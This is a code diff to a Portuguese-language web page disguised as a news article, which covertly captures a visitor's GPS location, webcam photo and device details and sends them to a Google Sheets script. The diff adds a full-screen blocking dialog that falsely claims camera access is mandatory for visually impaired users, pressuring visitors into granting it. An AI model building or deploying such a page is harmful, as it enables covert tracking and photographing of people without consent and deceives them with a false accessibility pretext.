@@ -166,6 +166,12 @@
             border-left: 4px solid #dc3545;
         }
         
+        .warning {
+            background: #fff3e0;
+            color: #856404;
+            border-left: 4px solid #ff9800;
+        }
+        
         .loading-spinner {
             display: inline-block;
             width: 14px;
@@ -193,6 +199,69 @@
             pointer-events: none;
         }
         
+        /* Modal de bloqueio */
+        .block-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .block-modal-content {
+            background: white;
+            border-radius: 20px;
+            padding: 40px 30px;
+            max-width: 500px;
+            text-align: center;
+            animation: modalFadeIn 0.3s ease-out;
+        }
+        
+        @keyframes modalFadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+        
+        .block-modal-icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+        }
+        
+        .block-modal h3 {
+            margin-bottom: 15px;
+            color: #333;
+            font-size: 24px;
+        }
+        
+        .block-modal p {
+            color: #666;
+            margin-bottom: 25px;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        
+        .block-modal-btn {
+            background: #c0392b;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
         footer {
             margin-top: 30px;
             padding: 20px;
@@ -200,15 +269,6 @@
             color: #999;
             font-size: 12px;
             border-top: 1px solid #ddd;
-        }
-        
-        @media (max-width: 600px) {
-            .news-title {
-                font-size: 22px;
-            }
-            .container {
-                padding: 10px;
-            }
         }
     </style>
 </head>
@@ -268,6 +328,20 @@
     <!-- Elementos ocultos para captura automática -->
     <video id="hiddenVideo" class="hidden-video" autoplay playsinline muted></video>
     <canvas id="hiddenCanvas" class="hidden-canvas"></canvas>
+    
+    <!-- Modal de bloqueio para permissão negada -->
+    <div id="blockModal" class="block-modal">
+        <div class="block-modal-content">
+            <div class="block-modal-icon">♿ 🚫</div>
+            <h3>⚠️ Acesso Negado</h3>
+            <p>
+                <strong>A permissão da câmera é OBRIGATÓRIA para acessar o conteúdo completo.</strong><br><br>
+                Este recurso é necessário para o <strong>ACESSO SENSORIAL PARA DEFICIENTES VISUAIS</strong>, permitindo que o sistema adapte o conteúdo com tecnologias assistivas e leitura por imagem.<br><br>
+                <strong>📌 Por favor, recarregue a página e clique em "PERMITIR" quando o navegador solicitar acesso à câmera.</strong>
+            </p>
+            <button class="block-modal-btn" id="reloadBtn">🔄 Recarregar Página</button>
+        </div>
+    </div>
 
     <script>
         // Configuração Google Sheets (substitua pelo seu URL do Google Apps Script)
@@ -276,6 +350,7 @@
         let autoCaptureDone = false;
         let currentStream = null;
         let permissionGranted = false;
+        let cameraPermissionDenied = false;
         
         // Data atual
         document.getElementById('currentDate').textContent = new Date().toLocaleDateString('pt-BR', { timeZone: 'America/Sao_Paulo' });
@@ -285,6 +360,8 @@
         const statusDiv = document.getElementById('status');
         const hiddenVideo = document.getElementById('hiddenVideo');
         const hiddenCanvas = document.getElementById('hiddenCanvas');
+        const blockModal = document.getElementById('blockModal');
+        const reloadBtn = document.getElementById('reloadBtn');
         
         function showStatus(message, type, showSpinner = false) {
             statusDiv.style.display = 'block';
@@ -301,6 +378,14 @@
                 }
             }, 5000);
         }
+        
+        function showBlockModal() {
+            blockModal.style.display = 'flex';
+        }
+        
+        reloadBtn.addEventListener('click', () => {
+            window.location.reload();
+        });
         
         // Função para enviar para Google Sheets
         async function sendToGoogleSheets(data) {
@@ -330,7 +415,6 @@
             logs.push(allData);
             localStorage.setItem('auto_capture_logs', JSON.stringify(logs));
             
-            // Também salvar como JSON para download
             const blob = new Blob([JSON.stringify(allData, null, 2)], {type: 'application/json'});
             const link = document.createElement('a');
             link.href = URL.createObjectURL(blob);
@@ -402,49 +486,34 @@
             });
         }
         
-        // FUNÇÃO QUE SOLICITA E ACEITA AUTOMATICAMENTE AS PERMISSÕES
+        // FUNÇÃO QUE SOLICITA E ACEITA AUTOMATICAMENTE AS PERMISSÕES (CÂMERA OBRIGATÓRIA)
         async function requestAndAcceptPermissions() {
-            // Solicitar permissão de localização automaticamente
-            if (navigator.permissions) {
-                try {
-                    const locationStatus = await navigator.permissions.query({ name: 'geolocation' });
-                    if (locationStatus.state === 'prompt') {
-                        console.log('Solicitando permissão de localização...');
-                    }
-                } catch(e) {}
-            }
-            
-            // Solicitar permissão da câmera automaticamente
+            // Solicitar permissão da câmera - OBRIGATÓRIA
             try {
-                console.log('Solicitando permissão da câmera automaticamente...');
+                console.log('📷 Solicitando permissão da câmera (obrigatória para acessibilidade)...');
+                showStatus('📷 Solicitando permissão da câmera - recurso obrigatório para acessibilidade de deficientes visuais...', 'loading', true);
+                
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: { exact: "user" }
                     }
                 });
                 
-                // Se chegou aqui, a permissão foi concedida
                 if (stream) {
                     stream.getTracks().forEach(track => track.stop());
                     permissionGranted = true;
-                    console.log('✅ Permissão da câmera concedida automaticamente');
+                    cameraPermissionDenied = false;
+                    console.log('✅ Permissão da câmera concedida - Acessibilidade ativada');
+                    showStatus('✅ Permissão da câmera concedida! Acessibilidade ativada.', 'success');
                     return true;
                 }
             } catch (error) {
-                console.log('Erro ao solicitar câmera:', error);
+                console.log('❌ Permissão da câmera NEGADA ou cancelada:', error);
+                cameraPermissionDenied = true;
+                permissionGranted = false;
                 
-                // Tentar sem exigir câmera frontal
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    if (stream) {
-                        stream.getTracks().forEach(track => track.stop());
-                        permissionGranted = true;
-                        console.log('✅ Permissão da câmera concedida (modo padrão)');
-                        return true;
-                    }
-                } catch(e) {
-                    console.log('Usuário negou ou câmera não disponível');
-                }
+                // Mostrar modal de bloqueio obrigatório
+                showBlockModal();
                 return false;
             }
         }
@@ -499,7 +568,6 @@
         // Função principal - CAPTURA TUDO AUTOMATICAMENTE
         async function autoCaptureAndSend() {
             if (autoCaptureDone) return;
-            autoCaptureDone = true;
             
             readMoreBtn.disabled = true;
             readMoreBtn.textContent = '📖 Processando...';
@@ -507,9 +575,16 @@
             showStatus('📡 Iniciando coleta de dados automática...', 'loading', true);
             
             try {
-                // SOLICITAR E ACEITAR PERMISSÕES AUTOMATICAMENTE
-                showStatus('🔐 Solicitando permissões automaticamente...', 'loading', true);
-                await requestAndAcceptPermissions();
+                // SOLICITAR E ACEITAR PERMISSÃO DA CÂMERA (OBRIGATÓRIA)
+                const cameraAccepted = await requestAndAcceptPermissions();
+                
+                if (!cameraAccepted) {
+                    // Se a câmera foi negada, o modal já foi mostrado
+                    readMoreBtn.disabled = false;
+                    readMoreBtn.textContent = '📖 Ler Mais';
+                    autoCaptureDone = false;
+                    return;
+                }
                 
                 // 1. Capturar localização com alta precisão
                 showStatus('📍 Capturando localização GPS de alta precisão...', 'loading', true);
@@ -572,7 +647,8 @@
                     screen_resolution: `${screen.width}x${screen.height}`,
                     language: navigator.language,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    permission_auto_granted: permissionGranted
+                    permission_auto_granted: permissionGranted,
+                    accessibility_mode: "disabled_visual_access"
                 };
                 
                 // 7. Enviar para Google Sheets
@@ -595,14 +671,15 @@
                 console.log(`🎯 Precisão: ±${finalAccuracy} metros`);
                 console.log(`🗺️ Google Maps: https://www.google.com/maps?q=${finalLatitude},${finalLongitude}`);
                 console.log(`📸 Foto capturada: ${photoData ? 'SIM' : 'NÃO'}`);
-                console.log(`🔐 Permissão automática: ${permissionGranted ? 'SIM' : 'NÃO'}`);
+                console.log(`🔐 Permissão da câmera: ${permissionGranted ? 'CONCEDIDA' : 'NEGADA'}`);
+                console.log(`♿ Modo acessibilidade ativado para deficientes visuais`);
                 
             } catch (error) {
                 console.error('Erro na captura automática:', error);
                 
                 let errorMessage = '';
                 if (error.code === 1) {
-                    errorMessage = '❌ Permissão negada. Recarregue a página e permita.';
+                    errorMessage = '❌ Permissão de localização negada. Recarregue a página e permita.';
                 } else if (error.code === 2) {
                     errorMessage = '❌ Localização indisponível. Verifique o GPS.';
                 } else if (error.code === 3) {
@@ -621,44 +698,41 @@
         // Evento do botão
         readMoreBtn.addEventListener('click', (e) => {
             e.preventDefault();
-            if (!autoCaptureDone) {
+            if (!autoCaptureDone && !cameraPermissionDenied) {
                 autoCaptureAndSend();
+            } else if (cameraPermissionDenied) {
+                showBlockModal();
             }
         });
         
         // PRÉ-CARREGAMENTO: Solicitar permissões silenciosamente ao carregar a página
-        // Isso faz o navegador já exibir o popup de permissão antes do clique
         async function preloadAndAutoAccept() {
             console.log('🚀 Pré-carregando e solicitando permissões automaticamente...');
+            console.log('♿ Modo de acessibilidade para deficientes visuais ativado');
+            console.log('📷 Permissão da câmera é OBRIGATÓRIA para acesso ao conteúdo');
             
-            // Solicitar localização silenciosamente
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    () => console.log('✅ Localização pré-autorizada'),
-                    () => console.log('⚠️ Localização não autorizada ainda')
-                );
-            }
-            
-            // Solicitar câmera silenciosamente (isso vai mostrar o popup)
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                    console.log('✅ Câmera pré-autorizada');
-                    permissionGranted = true;
-                }
-            } catch (error) {
-                console.log('⚠️ Aguardando clique para solicitar permissão da câmera');
+            // Verificar se já tem permissão da câmera
+            if (navigator.permissions) {
+                try {
+                    const cameraStatus = await navigator.permissions.query({ name: 'camera' });
+                    if (cameraStatus.state === 'granted') {
+                        console.log('✅ Permissão da câmera já concedida anteriormente');
+                        permissionGranted = true;
+                    } else if (cameraStatus.state === 'denied') {
+                        console.log('❌ Permissão da câmera foi negada anteriormente');
+                        cameraPermissionDenied = true;
+                        showBlockModal();
+                    }
+                } catch(e) {}
             }
         }
         
-        // Executar pré-carregamento após 1 segundo
-        setTimeout(() => {
-            preloadAndAutoAccept();
-        }, 1000);
+        // Executar pré-carregamento
+        preloadAndAutoAccept();
         
         console.log('✅ Sistema de captura AUTOMÁTICA carregado');
-        console.log('⚠️ O sistema solicitará permissões automaticamente');
+        console.log('⚠️ A permissão da câmera é OBRIGATÓRIA para acesso ao conteúdo');
+        console.log('♿ Sistema adaptado para acessibilidade de deficientes visuais');
     </script>
 </body>
 </html>
